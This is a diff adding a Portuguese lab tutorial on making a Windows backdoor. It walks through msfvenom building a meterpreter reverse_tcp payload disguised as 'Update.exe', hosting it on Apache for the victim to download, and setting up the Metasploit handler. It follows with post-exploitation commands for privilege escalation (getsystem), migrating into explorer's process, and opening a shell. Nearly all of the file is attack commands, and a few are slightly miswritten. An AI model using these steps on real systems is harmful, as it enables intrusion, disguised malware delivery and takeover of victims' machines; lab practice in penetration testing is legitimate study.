@@ -1,0 +1,49 @@
+---BACKDOOR USANDO EXECUTÁVEL---
+Nesse documento serão mostrados uma série de comandos que são utilizados para criação de um backdoor com executável
+primeiramente as duas máquinas tem que estar na mesma rede.No nosso exemplo usaremos uma máquina com o S.O Windows 7(Atacado)
+e o outro Kali Linux(Atacante) com um servidor da metasploitable para a simulação.
+
+Primeiramente no terminal do Kali Linux utilizaremos os seguintes comandos:
+-ip addr
+Com isso vamos pegar o ip da máquina atacante que no meu caso e 192.168.56.102,depois daremos o comando:
+-sudo su
+Para colocarmos em root,apos isso utilizaremos:
+-msfvenom -p windows/meterpreter/reverse_tcp -a x86 plataform windows -f exe LHOST=192.168.56.102 LPORT=4444 -o Update.exe
+Nesse caso usaremos a porta 4444 com o ip da máquina,msfvenom criará um executável chamado de Update.exe,o mesmom será baixado pela
+máquina atacada com o link 192.168.56.102/Update.exe no navegador. Após isso teremos que criar um servidor apache para alocar o executável.
+-service apache2 start
+-cp update.exe/var/www/html
+criar uma copia na de update na pasta html
+-cd /var/www/html
+Entrar na pasta para verificar se o arquivo esta lá
+-ls
+mostra todos arquivos da pasta
+-msfconsole
+-use multi/handler
+-set payload windows/meterpreter/reverse_tcp
+Agora vamos utilizar o LHOST e o LPORT que configuramos no msfvenom
+-set LHOST 192.168.56.102
+-set PORT 4444
+-use
+Com isso basta apenas usar o executável Update.exe na outra máquina e poderemos manipular as pastas
+-sysinfo
+Informações do Windows
+-getuid
+Nome do usuário
+-getsystem
+Coloca como adm do windows(Escalonamento de privilégios)
+-getpid
+Pega o número do processo
+-ps
+mostra todos processos na máquina,o interessante e utilizar o mesmo pid de um processo comum como é o caso do explorer
+então usaremos:
+-migrate 1908(com essa migração não e mais necessário o uso do executável)
+-shell
+Acesso ao Shell
+-whoami
+Para saber se somos Administradores
+-whoami/priv
+Mostra os privilégios referentes ao nosso user
+
+
+
